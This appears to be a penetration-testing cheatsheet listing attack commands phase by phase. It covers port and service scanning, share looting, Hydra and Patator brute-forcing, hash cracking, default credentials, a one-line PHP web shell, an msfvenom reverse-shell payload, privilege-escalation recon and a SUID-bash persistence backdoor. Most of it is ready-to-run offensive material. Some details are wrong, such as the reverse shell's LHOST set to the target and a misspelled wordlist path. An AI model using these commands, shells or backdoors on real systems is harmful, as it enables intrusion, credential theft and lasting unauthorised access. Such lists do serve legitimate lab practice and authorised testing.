# Penetration Testing Cheatsheet

## Reconnaissance
### Ports
```bash
sudo nmap $TARGET -sS -sU -oN scans/$TARGET-nmap-initial
sudo nmap $TARGET -sS -sU -p- -oN scans/$TARGET-nmap-complete
```

## Enumeration
### Service Versions
```bash
sudo nmap $TARGET -sV -sC $(print-open-ports-from-nmap-scan scans/$NAME-nmap-complete) -oN scans/$NAME-nmap-versions
```

### Operating System
```bash
sudo nmap $TARGET -O -oN scans/$NAME-nmap-os
```

#### FTP
```bash
cd loot
touch README.too # create a file
ftp $TARGET 21 # login using anonymous:anonymous
put README.too # upload file created above (i.e. check if we have write privileges)
ls
binary 
get file.txt # download a file (i.e. check if we have read privileges)
mget * # download everything
exit
```

#### SSH
```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt  ssh://10.11.12.13
```

#### SMTP
```bash
sudo nmap $TARGET -p25 --script smtp-commands -oN scans/$NAME-nmap-scripts-smtp-commands
```

```bash
sudo nmap $TARGET -p25 --script smtp-enum-users --script-args smtp-enum-users.methods={VRFY,EXPN,RCPT} -oN scans/$NAME-nmap-scripts-smtp-enum-users
```

```bash
smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t $TARGET
```

Automated enumeration of exploitable SMTP vulnerabilities.
```bash
sudo nmap $TARGET -p25 --script smtp-vuln* -oN scans/mailman-nmap-scripts-smtp-vuln
# replace the lines above with the actual scan results
```

### HTTP
```bash
sudo nmap $TARGET -p80 --script http-shellshock -oN scans/$NAME-nmap-scripts-http-shellshock-80
```

```bash
dirb http://$TARGET:80 /usr/share/wordlists/dirb/big.txt -z10 -o scans/$NAME-dirb-big-80
```

```bash
dirsearch -u $TARGET:$PORT -o $FULLPATH/$NAME-dirsearch-80
```

```bash
nikto -h $TARGET -p $PORT -T 2 -Format txt -o scans/$NAME-nikto-misconfig-80
```

### RPC
```bash
rpcclient -U '' $TARGET
srvinfo
netshareenum
```

### NetBIOS
```bash
nbtscan $TARGET
```

### SMB
The following SMB shares were discovered using Smbclient.
```bash
smbclient -L $TARGET
```

The SMB shares discovered have the following permissions.
```bash
smbmap -H $TARGET
```

Download files.
```bash
cd loot
smbclient \\\\$TARGET\\$SHARE
prompt
mget *
```

```bash
# check if vulnerable to EternalBlue
sudo nmap $TARGET -p445 --script smb-vuln-ms17-010 -oN scans/$NAME-nmap-scripts-smb-vuln-ms17-010
```

The target is NOT vulnerable to SambaCry.
```bash
# check if vulnerable to SambaCry
sudo nmap $TARGET -p445 --script smb-vuln-cve-2017-7494 --script-args smb-vuln-cve-2017-7494.check-version -oN scans/$NAME-nmap-scripts-smb-vuln-cve-2017-7494
```

### SQL
```bash
mysql -u $USER -h $TARGET
```

### RDP
```bash
sudo nmap $TARGET -p3389 --script rdp-ntlm-info -oN scans/$NAME-nmap-scripts-rdp-ntlm-info
```

```bash
rdesktop -u administrator $TARGET
```

### Postgres
```bash
psql -U postgres -p 5437 -h $TARGET # postgres:postgres
SELECT pg_ls_dir('/');
```

## Gaining Access
### Password Guessing  
#### Default Credentials
```bash
# anonymous:anonymous
# guest:guest
# admin:admin
# admin:adminadmin
```

#### Hydra
```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt $TARGET http-post-form "/phpmyadmin/index.php?:pma_username=^USER^&pma_password=^PASS^:Cannot|without"
```

#### Patator
```bash
patator http_fuzz url=http://$TARGET/$LOGIN method=POST body='username=FILE0&password=FILE1' 0=usernames.txt 1=/usr/share/wordlists/rockyout.txt -x ignore:fgrep=Unauthorized
```

#### Hashcat
```hash
# modes - SHA256: 1400
# attacks - Dictionary: 0
hashcat -m $MODE -a $ATTACK /path/to/hashes.txt /usr/share/wordlists/rockyou.txt 
hashcat -m 1400 -a 0 /path/to/hashes.txt /usr/share/wordlists/rockyou.txt 
```

### Remote File Inclusion
```bash
# find a way to upload a PHP command shell
vim cmd.php
<?php echo shell_exec($_GET['cmd']); ?>
```

### Reverse Shell
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=$TARGET LPORT=$PORT -f elf -o rshell.elf
```

## Maintaining Access

### Privilege Escalation
#### Linux
```bash
whoami
uname -a
dpkg -l # debian
rpm -qa # red hat
cat /etc/passwd
find / -perm -u=s -type f 2> /dev/null
cat /etc/crontab
ps aux | grep -v "\[" | grep root
```

#### Windows
```bash
whoami
whoami /priv
net user
systeminfo
dir c:\
wmic service get name,startname
cd "c:\program files"
cd "c:\program files (x86)"
wmic service get name,pathname,startname | findstr "Program Files"
cacls *.exe
```

### Persistence
#### Rootbash
Credit: Tib3rius
```bash
# as root, create a copy of BASH and then set the SUID-bit
# to resume root-access execute the new binary using -p
# root must own the new binary so use chown if necessary
cp /bin/bash /tmp/bash
chown root /tmp/bash
chmod u+s /tmp/bash
chmod o+x
/tmp/bash -p
```

```bash
# same technique as above, but as a one-liner
cp /bin/bash /tmp/bash; chown root /tmp/bash; chmod u+s /tmp/bash; chmod o+x /tmp/bash
/tmp/bash -p
```

```bash
# if you want to try the technique above albeit locally on a box you already own
sudo cp /bin/bash /tmp/bash; sudo chmod +s /tmp/bash
/tmp/bash -p
```